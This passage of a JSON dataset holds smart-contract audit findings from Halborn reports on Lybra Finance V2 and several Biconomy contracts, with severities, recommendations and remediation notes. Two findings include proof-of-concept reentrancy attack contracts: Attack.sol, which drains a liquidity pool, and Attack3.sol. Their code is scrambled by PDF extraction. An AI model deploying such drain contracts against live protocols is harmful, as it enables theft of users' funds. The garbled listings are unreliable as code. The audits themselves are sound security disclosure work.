        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The contract LybraGovernance inherits from GovernorTimelockControl con- tract which inherits itself from the Governor contract. The version 4.9.0 of the Governor contract is vulnerable to an issue whereby front running the creation of a proposal, an attacker can become the proposer and gain the ability to cancel it. The attacker can do this repeatedly to try to prevent a proposal from being proposed at all. Moreover, LybraV2 project dependencies are defined in the package.json file: Listing 7: package.json (Line 14) 1 { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 } \" name \" : \" lybra - protocol \" , \" scripts \" : { \" build \" : \" hardhat compile \", \" test \": \" hardhat test \" } , \" devDependencies \": { \" hardhat \": \" ^2.14.0 \" } , \" dependencies \": { \" @chainlink / contracts \" : \" ^0.6.1 \", \" @layerzerolabs / solidity - examples \": \" ^0.0.12 \" , \" @nomicfoundation / hardhat - toolbox \": \" ^2.0.2 \" , \" @openzeppelin / contracts \" : \" ^4.8.3 \" , \" hardhat - gas - reporter \" : \" ^1.0.9 \" } 33 As the openzeppelin/contracts version used is ^4.8.3, upon installation of the dependencies it is entirely possible to install a vulnerable version, making the LybraGovernance vulnerable to this exploit. References: https://github.com/OpenZeppelin/openzeppelin-contracts/security/ advisories/GHSA-5h3x-9wvq-w4m2 https://www.coinspect.com/openzeppelin-governor-dos/ BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:N/S:C (6.2) Recommendation: It is recommended to enforce in the package.json file to use the openzeppelin/contracts version 4.9.1 where this bug is solved. Remediation Plan: SOLVED: The Lybra Finance team solved the issue by implementing the rec- ommended solution. Commit ID : d050e08072633dcccd69155a36901c9434dfdb58. 34 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "CENTRALIZATION ISSUE: LYBRAGOVERNANCE DEPLOYER HAS DAO AND GOV ROLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the GovernanceTimelock contract, the deployer is directly assigned the DAO and GOV roles: Listing 8: GovernanceTimelock.sol (Lines 19,20) 14 constructor ( uint256 minDelay , address [] memory proposers , address  [] memory executors , address admin ) TimelockController ( minDelay ,  proposers , executors , admin ) { 15 16 17 18 19 20 21 } _setRoleAdmin ( DAO , GOV ); _setRoleAdmin ( TIMELOCK , GOV ); _setRoleAdmin ( ADMIN , GOV ); _grantRole ( DAO , address ( this )); _grantRole ( DAO , msg . sender ); _grantRole ( GOV , msg . sender ); The DAO role and hence the GovernanceTimelock contracts deployer has permissions to do any type of update in the LybraConfigurator contract. This totally defeats the purpose of a DAO, as a single address has permissions to perform any change in the protocol. This presents several concerns: 1. Centralization of Power: The essence of a DAO is to decentralize decision-making and reduce single points of failure or control. By assigning the DAO role to the contracts deployer, a centralized entity gets the power to make significant protocol changes, which contradicts the principles of decentralization. 35 2. Attack Surface Increase: Granting both DAO and GOV roles to a single entity, especially at deployment, amplifies the attack surface. If the deployers private key is compromised, an attacker could make arbitrary changes to the protocol. 3. Loss of Credibility: One of the draws for many users towards DAOs is trust in decentralized governance and decision-making. If users or investors discover that a single entity has the capability to alter the protocol unilaterally, it could lead to a loss of faith in the project, affecting adoption and token value. 4. Potential for Malicious or Accidental Actions: With such permis- sions, even a well-intentioned deployer might inadvertently in- troduce bugs or make changes that are not in the best interest of the community. This poses both security and trust risks. BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:C (6.2) Recommendation: It is recommended to not assign the DAO and GOV roles to the GovernanceTimelock contracts deployer. Remediation Plan: SOLVED: The Lybra Finance team solved the issue by implementing the rec- ommended solution. Commit ID : 77e8bc3664fb1b195fd718c2ce1d49af8530f981. 36 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING STALENESS CHECKS IN THE CHAINLINK.LATESTROUNDDATA(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In multiple contracts, the latestRoundData() function of Chainlink price feeds is called to retrieve the price of different assets. Although, these calls are performed without any kind of staleness checks nor price validation. There are no checks on roundID or timeStamp. If there is a problem with Chainlink starting a new round and finding consensus on the new value for the oracle (e.g. Chainlink nodes abandoning the oracle, chain congestion, vulnerability/attacks on the Chainlink system) consumers of these contracts may continue using obsolete data. the hand, other documentation, On latestRoundData() does not raise an error if no response has been reached, but returns 0, in this case feeding an incorrect price to the contracts. Chainlinks according to Code location: LybraConfigurator.sol - Line 320: (, int price, , , )= eUSDPriceFeed.latestRoundData(); EUSDMiningIncentives.sol - Line 189: (, int etherPrice, , , )= etherPriceFeed.latestRoundData(); - Line 190: (, int lbrPrice, , , )= lbrPriceFeed.latestRoundData(); - Line 267: (, int lbrPrice, , , )= lbrPriceFeed.latestRoundData(); 37 ProtocolRewardsPool.sol - Line 151: (, int lbrPrice, , , )= lbrPriceFeed.latestRoundData(); BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:U (5.0) Recommendation: It is recommended to use Chainlinks latestRoundData() function with checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example: Listing 9: latestRoundData example call (Line 2) 1 uint256 private constant GRACE_PERIOD_TIME = 7200; // 2 hours 2 ( uint80 roundId , int256 price , uint256 startedAt , uint256  updatedAt , uint80 answeredInRound ) = eUSDPriceFeed . latestRoundData  () ; 3 require ( answeredInRound >= roundID , \" Stale price \" ); 4 require ( price > 0, \" invalid price \" ); 5 require ( block . timestamp <= updatedAt + GRACE_PERIOD_TIME , \" Stale  price \" ); If in the case that we are dealing with Price Feeds in Arbitrum, the sequencer state should be validated, ensuring that is up before accepting any price as valid. Remediation Plan: RISK ACCEPTED: The Lybra Finance team accepted the risk of this finding. 38 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING BURNENABLED MODIFIER IN THE PEUSDMAINNET.CONVERTTOEUSD(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the PeUSDMainnet contract, the modifier burnEnabled ensures that the burning is not paused in the LybraConfigurator contract: Listing 10: PeUSDMainnet.sol (Line 51) 50 modifier burnEnabled () { 51 52 53 } require (! configurator . vaultBurnPaused ( msg . sender ) , \" BPP \" ); _; Although, the function convertToEUSD(), which burns peUSD by calling the _burn() internal function is missing this modifier: Listing 11: PeUSDMainnet.sol (Line 111) 104 /* * 105 106 * @dev Allows users to repay peUSD tokens and retrieve eUSD . * @param peusdAmount The amount of peUSD tokens to burn and  retrieve eUSD . The user 's balance of peUSD tokens must be greater  than or equal to this amount . 107 108 109 * Requirements : * ` peusdAmount ` must be greater than 0. * The user 's ` mintedPeUSD ` must be greater than or equal to `  peusdAmount `. */ 110 111 function convertToEUSD ( uint256 peusdAmount ) external { 112 require ( peusdAmount <= userConvertInfo [ msg . sender ]. mintedPeUSD 39  && peusdAmount != 0, \" PCE \" ); 113 114 _burn ( msg . sender , peusdAmount ); uint256 share = ( userConvertInfo [ msg . sender ].  depositedEUSDShares * peusdAmount ) / userConvertInfo [ msg . sender ].  mintedPeUSD ; 115 116 117 118 userConvertInfo [ msg . sender ]. mintedPeUSD -= peusdAmount ; userConvertInfo [ msg . sender ]. depositedEUSDShares -= share ; EUSD . transferShares ( msg . sender , share ); emit ConvertToEUSD ( msg . sender , peusdAmount , EUSD .  getMintedEUSDByShares ( share ) , block . timestamp ); 119 } Hence, users would still be able to burn peUSD through the usage of this function even if the burning is paused for this vault in the LybraConfigurator contract. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:C (3.1) Recommendation: It is recommended to add the burnEnabled modifier to the PeUSDMainnet. convertToEUSD() function. Remediation Plan: RISK ACCEPTED: The Lybra Finance team accepted the risk of this finding. 40 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING MINTENABLED MODIFIER IN THE PEUSDMAINNET.CONVERTTOPEUSD(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the PeUSDMainnet contract, the modifier mintEnabled ensures that the minting is not paused in the LybraConfigurator contract: Listing 12: PeUSDMainnet.sol (Line 47) 46 modifier mintEnabled () { 47 48 49 } require (! configurator . vaultMintPaused ( msg . sender ) , \" MPP \" ); _; Although, the function convertToPeUSD(), which mints peUSD by calling the _mint() internal function is missing this modifier: Listing 13: PeUSDMainnet.sol (Line 75) * @param eusdAmount The amount of eUSD to deposit and mint peUSD * @notice Allows the user to deposit eUSD and mint peUSD tokens . * @param user The address of the user who wants to deposit eUSD 70 /* * 71 72  and mint peUSD . It can only be the contract itself or the msg .  sender . 73  tokens . 74 */ 75 function convertToPeUSD ( address user , uint256 eusdAmount ) public { 76 require ( _msgSender () == user || _msgSender () == address ( this ) ,  \" MDM \" ); 77 require ( eusdAmount != 0 , \" ZA \"); 41 require ( success , \" TF \" ); userConvertInfo [ user ]. depositedEUSDShares += EUSD . require ( EUSD . balanceOf ( address ( this )) + eusdAmount <= bool success = EUSD . transferFrom ( user , address ( this ) , 78  configurator . getEUSDMaxLocked () ,\" ESL \" ); 79  eusdAmount ); 80 81  getSharesByMintedEUSD ( eusdAmount ); 82 83 84  timestamp ); 85 } userConvertInfo [ user ]. mintedPeUSD += eusdAmount ; _mint ( user , eusdAmount ); emit ConvertToPeUSD ( msg . sender , eusdAmount , eusdAmount , block . Hence, users would still be able to mint peUSD through the usage of this function even if the minting is paused for this vault in the LybraConfigurator contract. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:C (3.1) Recommendation: It is recommended to add the mintEnabled modifier to the PeUSDMainnet. convertToPeUSD() function. Remediation Plan: RISK ACCEPTED: The Lybra Finance team accepted the risk of this finding. 42 4.10 (HAL-10) LYBRARETHVAULT.DEPOSITETHERTOMINT() FUNCTION CALLS MAY REVERT - LOW (2.5) Commit IDs affected: - 90285107de8a6754954c303cd69d97b5fdb4e248 ",
        "labels": [
            "Halborn",
            "Lybra_Finance_V2",
            "Severity: Informational"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Forwarder_Smart_Contract_Solidity_Audit_Report_Halborn_Final.pdf",
        "body": "The Owner of the contract is usually the account that deploys the contract. As a result, the Owner can perform some privileged functions. In the ERC20ForwarderImplementationV2.sol, BiconomyForwarderV2.sol, FeeManager .sol and OracleAggregator.sol smart contracts, the renounceOwnership function is used to renounce the Owner permission. Renouncing owner- ship before transferring would result in the contract having no Owner, eliminating the ability to call privileged functions. Code Location: Listing 1: ERC20ForwarderImplementationV2.sol (Line 24) 24 contract ERC20ForwarderImplementationV2 is Initializable ,  OwnableUpgradeable , ForwardRequestTypesV2 { 25 Listing 2: BiconomyForwarderV2.sol (Line 23) 23 contract BiconomyForwarderV2 is ForwardRequestTypesV2 , Ownable { 24 Listing 3: FeeManager.sol (Line 22) 22 contract FeeManager is IFeeManager , Ownable { 23 Listing 4: OracleAggregator.sol (Line 6) 6 contract OracleAggregator is Ownable { 7 12 Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended that the Owner cannot call renounceOwnership without transferring the Ownership to other address first. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. Remediation Plan: RISK ACCEPTED: The Biconomy team accepted the risk of this issue. 13 ",
        "labels": [
            "Halborn",
            "Biconomy_Forwarder",
            "Severity: Low"
        ]
    },
    {
        "title": "ZERO ADDRESS NOT CHECKED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Forwarder_Smart_Contract_Solidity_Audit_Report_Halborn_Final.pdf",
        "body": "The function setTokenOracle within the contract OracleAggregator.sol is not verifying the callAddress parameter is not the zero address to avoid having issues retrieving the token price data feed. Code Location: Listing 5: OracleAggregator.sol (Line 22) function setTokenOracle ( address token , address callAddress , 21  uint8 decimals , bytes calldata callData , bool signed ) external  onlyOwner { 22 23 24 25 26 tokensInfo [ token ]. callAddress = callAddress ; tokensInfo [ token ]. decimals = decimals ; tokensInfo [ token ]. callData = callData ; tokensInfo [ token ]. dataSigned = signed ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: When setting an address variable, always ensure the value is not zero. Remediation Plan: SOLVED: The issue was solved in commit ID: 11f8abf0c0b8c26ce7a21972b44d1c91a7c3f756 14 ",
        "labels": [
            "Halborn",
            "Biconomy_Forwarder",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING EVENTS EMITTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Forwarder_Smart_Contract_Solidity_Audit_Report_Halborn_Final.pdf",
        "body": "It has been observed that critical functionality is missing emitting event for setFeeManager function within the ERC20ForwarderImplementationV2.sol contract and the setTokenAllowed function within the FeeManager.sol contract. These functions should emit events after completing the transactions. Code Location: Listing 6: ERC20ForwarderImplementationV2.sol 105  { 106 107 108 function setFeeManager ( address _feeManager ) external onlyOwner require ( _feeManager != address (0) , \" ERC20Forwarder : new fee manager can not be a zero  address \" 109 110 111 } ); feeManager = _feeManager ; Listing 7: FeeManager.sol function setTokenAllowed ( address token , bool allowed ) external 97  onlyOwner { 98 99 } allowedTokens [ token ] = allowed ; Risk Level: Likelihood - 1 Impact - 1 15 Recommendation: Consider emitting an event when calling setFeeManager and setTokenAllowed functions. Remediation Plan: SOLVED: The issue was solved in commit ID: 11f8abf0c0b8c26ce7a21972b44d1c91a7c3f756 16 ",
        "labels": [
            "Halborn",
            "Biconomy_Forwarder",
            "Severity: Informational"
        ]
    },
    {
        "title": "WRONG FEE CALCULATION LEADS LOSS OF REWARD FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The LiquidityPool contract has claim gas fee mechanism for both ERC20 tokens and Native token. There are two functions to claim gas fee. The first function is withdrawErc20GasFee, used for claiming gas fee for ERC20 tokens. The withdrawNativeGasFee function is used for claiming gas fee for native token. It is impossible to withdraw native gas fees due to wrong fee amount of calculation on withdrawNativeGasFee function. Listing 1: LiquidityPool.sol 1 gasFeeAccumulatedByToken [ NATIVE ] = 0; 2 gasFeeAccumulatedByToken [ NATIVE ] = gasFeeAccumulatedByToken [ NATIVE  ] - _gasFeeAccumulated ; Basically, this function tries to substract _gasFeeAccumulated variable from 0. Therefore, this function will always revert, and native gas fees will remain in the contract. Code Location: Listing 2: LiquidityPool.sol (Lines 386,387) 383 function withdrawNativeGasFee () external onlyOwner whenNotPaused { 384 uint256 _gasFeeAccumulated = gasFeeAccumulated [ NATIVE ][  _msgSender () ]; 385 386 387 require ( _gasFeeAccumulated != 0 , \" Gas Fee earned is 0\" ); gasFeeAccumulatedByToken [ NATIVE ] = 0; gasFeeAccumulatedByToken [ NATIVE ] =  gasFeeAccumulatedByToken [ NATIVE ] - _gasFeeAccumulated ; 388 gasFeeAccumulated [ NATIVE ][ _msgSender () ] = 0; 15 389 bool success = payable ( _msgSender () ). send (  _gasFeeAccumulated ); 390 391 392 require ( success , \" Native Transfer Failed \" ); emit GasFeeWithdraw ( address ( this ) , _msgSender () ,  _gasFeeAccumulated ); 393 } Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to review this mathematical operation and correct as needed. Remediation Plan: SOLVED: The Biconomy team solved this issue by correcting the math oper- ation that was causing the loss of funds. Commit ID: fab4b8c0a10a3e0185b2a06b10248391837c07de 16 ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: Critical"
        ]
    },
    {
        "title": "REENTRANCY LEADS DRAIN OF FUNDS (PRIVILEGED USER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Reentrancy term comes from where a re-entrant procedure can be in- terrupted in the middle of its execution and then safely be called again (re-entered) before its previous invocations complete execution. In So- lidity, Reentrancy vulnerabilities are mostly critical because attackers can steal funds from contracts by exploiting this vulnerability. It has been observed that a malicious owner or malicious liquidity provider can drain all funds from the liquidity pool. Note: The risk level is decreased to Critical from High due to autho- rization level. Steps to Reproduce: 1. Alice (owner) deploys the LiquidityPool contract. 2. Bob (user1) transfer some funds (22 ETH) to LiquidityPool. 3. Carol (user2) transfer more funds (15 ETH) to LiquidityPool. 4. Alice deploys a malicious Attack contract. 5. Alice sets LiquidityProviders address to the attack contact. 6. Alice tries to send (1 ETH) to the attack contract. 7. Attack contract calls LiquidityPools transfer function reentrantly. 8. Attack contract consumes all ETH from LiquidityPool. 9. Alice destructs the Attack contract and gets all ETH. 17 PoC Code: Listing 3: Attack.sol constructor ( address _lpaddress ) public { owner = msg . sender ; lpool = LiquidityPool ( payable ( _lpaddress )) ; modifier onlyOwner () { require ( owner == msg . sender , \" Unauthorized \"); _; } address private owner ; LiquidityPool public lpool ; address private constant NATIVE = 0 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.8.0; 4 import \" ./ LiquidityPool . sol \" ; 5 6 contract Attack { 7 8  xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ; 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  { 27 28 29 30 31 32 33 34 } } fallback () external payable { selfdestruct ( payable ( owner )) ; return target . balance ; } } } } function destruct () external onlyOwner { if ( address ( lpool ). balance >= 1 ether ){ lpool . transfer ( NATIVE , address ( this ) , 1 ether ); function getBalance ( address target ) public view returns ( uint ) 18 Code Location: Listing 4: LiquidityPool.sol (Line 395) 395 function transfer ( address _tokenAddress , address receiver , uint256  _tokenAmount ) external whenNotPaused onlyLiquidityProviders { 396 397 if ( _tokenAddress == NATIVE ) { require ( address ( this ). balance >= _tokenAmount , \"  ERR__INSUFFICIENT_BALANCE \" ); 398  \" \"); 399 400 401 ( bool success , ) = receiver . call { value : _tokenAmount }( require ( success , \" ERR__NATIVE_TRANSFER_FAILED \"); } else { IERC20Upgradeable baseToken = IERC20Upgradeable (  _tokenAddress ); 402 require ( baseToken . balanceOf ( address ( this )) >=  _tokenAmount , \" ERR__INSUFFICIENT_BALANCE \"); 403 SafeERC20Upgradeable . safeTransfer ( baseToken , receiver ,  _tokenAmount ); 404 405 } } 19 Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to use nonReentrant modifier on transfer() function. Remediation Plan: SOLVED: The Biconomy team solved this issue by implementing nonReentrant modifier to the transfer() function. Commit ID: e00937d1ca0e800e69fcb87d0841a74c0083194a 20 ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: High"
        ]
    },
    {
        "title": "DIVISION BY ZERO BLOCKS TRANSFER OF FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The sendFundsToUser() is a function on the LiquidityPool contract that allows users to be paid in certain tokens for the specified chainIds. This function is only callable by executors. When an executor attempts to call this function, the following functions are also called sequentially: 1. sendFundsToUser() 2. getAmountToTransfer() 3. getTransferFee() In the last function, there is missing control for if denominator value is zero. There are some conditions that make the denominator be zero. For example; 1. If providedLiquidity and resultingLiquidity variables are zero. (if there is no liquidity on the pool) 2. When you try to send all liquidity to another user while providedLiq- uidity is zero. (if users made a direct transfer to the pool) 3. If maxFee equals to equilibriumFee and providedLiquidity variable is zero. As a result, these circumstances will block transfer of funds. 21 Code Location: Listing 5: LiquidityPool.sol (Line 358) 346 function getTransferFee ( address tokenAddress , uint256 amount )  public view returns ( uint256 fee ) { 347 uint256 currentLiquidity = getCurrentLiquidity (  tokenAddress ); 348 uint256 providedLiquidity = liquidityProviders .  getSuppliedLiquidityByToken ( tokenAddress ); 349 350 351 352 uint256 resultingLiquidity = currentLiquidity - amount ; uint256 equilibriumFee = tokenManager . getTokensInfo (  tokenAddress ). equilibriumFee ; 353 uint256 maxFee = tokenManager . getTokensInfo ( tokenAddress ).  maxFee ; 354 // Fee is represented in basis points * 10 for better  accuracy 355 uint256 numerator = providedLiquidity * equilibriumFee *  maxFee ; // F ( max ) * F( e ) * L ( e) 356 uint256 denominator = equilibriumFee * providedLiquidity +  ( maxFee - equilibriumFee ) * resultingLiquidity ; // F ( e) * L (e ) +  ( F( max ) - F ( e) ) * L( r) 357 358 359 } fee = numerator / denominator ; 22 Recommendation: It is recommended to implement additional check if denominator is equal to zero. For example; Listing 6: Possible Fix fee = numerator / denominator ; 1 if ( denominator > 0) { 2 3 } 4 else { 5 6 } fee = 0; Remediation Plan: SOLVED: The Biconomy team solved this finding by applying the recommen- dation above to the code that was causing the division by zero. Commit ID: 22618c038df5d27368ccac4c5451d2a0c9816513 23 ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "REENTRANCY ON LPTOKEN MINTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The LPToken contract is ERC721 token and uses tokenMetadata to keep de- posit amounts for other ERC20 tokens. When a user deposit native asset or ERC20 token to the Liquidity Pool over LiquidityProviders contract, LPToken is getting minted to track this operation. During this process, LiquidityProvider contract calls lptoken.mint() function and LPToken con- tract calls ERC721s _safeMint() function. The _safeMint() function has any callbacks, and malicious contract with onERC721Received callback can re-enter to other contracts. This can lead to unexpected situations. PoC Code: Note: The following code does not mint unlimited LPTokens with 1 ETH. It is just added to show that Re-entrancy is possible. However, this situation may produce unexpected results. Listing 7: Attack3.sol (Line 16) LiquidityProviders public liquidityproviders ; 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.8.0; 4 import \" ./ LiquidityProviders . sol \"; 5 import \" @openzeppelin / contracts - upgradeable / token / ERC721 /  IERC721ReceiverUpgradeable . sol \" ; 6 7 contract Attack3 is IERC721ReceiverUpgradeable { 8 9 10 11 12 13 14 15 16 17 function onERC721Received ( address operator , constructor () public {} function setLProvider ( address _lproviders ) external { liquidityproviders = LiquidityProviders ( payable ( _lproviders )); } 24 address from , uint256 tokenId , bytes calldata data ) external override returns ( bytes4 ) { if ( tokenId < 10) { liquidityproviders . addNativeLiquidity { value : 1 e12 }() ; return IERC721ReceiverUpgradeable . onERC721Received . return IERC721ReceiverUpgradeable . onERC721Received . receive () external payable {} function attack () external payable { liquidityproviders . addNativeLiquidity { value : msg . value }() ; 18 19 20 21 22 23  selector ; } 24 25 else { 26  selector ; } 27 28 29 30 31 32 33 34 35 } } } 25 Code Location: Listing 8: LPToken.sol (Line 65) 63 function mint ( address _to ) external onlyHyphenPools whenNotPaused  returns ( uint256 ) { 64 65 66 67 uint256 tokenId = totalSupply () + 1; _safeMint ( _to , tokenId ); return tokenId ; } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to implement nonReentrant modifier to the mint function. Other workarond is using _mint function that does not have callback instead of _safeMint function. Remediation Plan: SOLVED: nonReentrant modifier to the mint() function. Biconomy team solved this The issue by implementing the Commit ID: cce62223d4779792ea68f3570b576da12dc96eb2 26 ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Hyphen contracts have address fields on multiple functions. These func- tions have missing address validations. Every address should be validated and checked that is different from zero. This is also considered a best practice. During the test, it has seen some of these inputs are not protected against using the address(0) as the target address. Code Location: Listing 9: Functions with missing zero address checks 1 LPToken . setLiquidtyPool ( address ). _lpm 2 LPToken . updateLiquidityPoolAddress ( address ). _liquidityPoolAddress 3 LiquidityPool . transfer ( address , address , uint256 ). receiver Risk Level: Likelihood - 2 Impact - 2 Recommendations: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: This issue solved by Biconomy team after adding additional zero address checks to the code as it recommended. 27 Commit ID: 5c57ae6eddcddde2f89ed00d9c5387ff151774ea 28 ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Note: This issue is created for other functions that were not exploited. Code Location: Listing 10: Possible Vulnerable Functions 1 LiquidityPool . depositErc20 () 2 LiquidityPool . depositNative () 3 LiquidityPool . getAmountToTransfer () 4 LiquidityPool . withdrawErc20GasFee () 5 LiquidityPool . withdrawNativeGasFee () 6 LiquidityPool . transfer () 7 LiquidityProviders . addNativeLiquidity () 8 LiquidityProviders . addTokenLiquidity () 9 LiquidityProviders . increaseTokenLiquidity () 10 LiquidityProviders . increaseNativeLiquidity () 11 LiquidityProviders . removeLiquidity () 12 LiquidityProviders . claimFee () Risk Level: Likelihood - 2 Impact - 2 29 Recommendation: The functions on the code location section have missing nonReentrant modifiers. It is recommended to add OpenZeppelin ReentrancyGuard library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. Remediation Plan: SOLVED: This vulnerability was eliminated by adding the nonReentrant modifier to functions mentioned above. Commit ID: e511a8a02ab298526689cef653c905b6b2d452e3 30 ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "DISCREPANCY ON FUNCTION NAMING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The setLiquidtyPool function on the LPToken contract is named incon- Similarly, there is a setLiquidityPool function on the sistently. As LiquidityProviders contract which uses LiquidityPool as argument. a result of the function named in this way in the LPToken contract, if the contract owner gives the LiquidityPool address as an argument instead of the LiquidityProvider address, the transactions on the contract do not work properly. Code Location: Listing 11: LiquidityProviders.sol 138 function setLiquidityPool ( address _liquidityPool ) external  onlyOwner { 139 140 } liquidityPool = ILiquidityPool ( _liquidityPool ); Listing 12: LPToken.sol 45 function setLiquidtyPool ( address _lpm ) external onlyOwner { 46 47 48 liquidityPoolAddress = _lpm ; emit LiquidityPoolUpdated ( _lpm ); } Risk Level: Likelihood - 2 Impact - 2 31 Recommendation: It is recommended to rename LPTokens setLiquidtyPool function. Remediation Plan: SOLVED: This issue was solved after renaming the setLiquidtyPool function to setLiquidityProviders. Commit ID: 9e16cd0e6b6e66d5f02792d0705149c873daf287 32 ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The project contains many instances of floating pragma. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too recent which has not been extensively tested. Code Location: Listing 13: Floating Pragma 1 LiquidityProviders . sol :: pragma solidity ^0.8.0 2 WhitelistPeriodManager . sol :: pragma solidity ^0.8.0 3 LPToken . sol :: pragma solidity ^0.8.0 4 ERC2771Context . sol :: pragma solidity ^0.8.0 5 ERC2771ContextUpgradeable . sol :: pragma solidity ^0.8.0 6 ILPToken . sol :: pragma solidity ^0.8.0 7 ILiquidityPool . sol :: pragma solidity ^0.8.0 8 ILiquidityProviders . sol :: pragma solidity ^0.8.0 9 ITokenManager . sol :: pragma solidity ^0.8.0 10 IWhitelistPeriodManager . sol :: pragma solidity ^0.8.0 11 LpTokenMetadata . sol :: pragma solidity ^0.8.0 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider locking the pragma version with known bugs for the compiler When possible, do not use version by removing the caret (^) symbol. 33 floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: The Biconomy team solved this issue by locking pragma versions. Commit ID: d7ca2d430b08296b742db3d0c39cc0dfa7201330 34 ",
        "labels": [
            "Halborn",
            "Biconomy_Hyphen_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ADDRESS CONTROL ON ADDEXECUTOR FUNCTION",
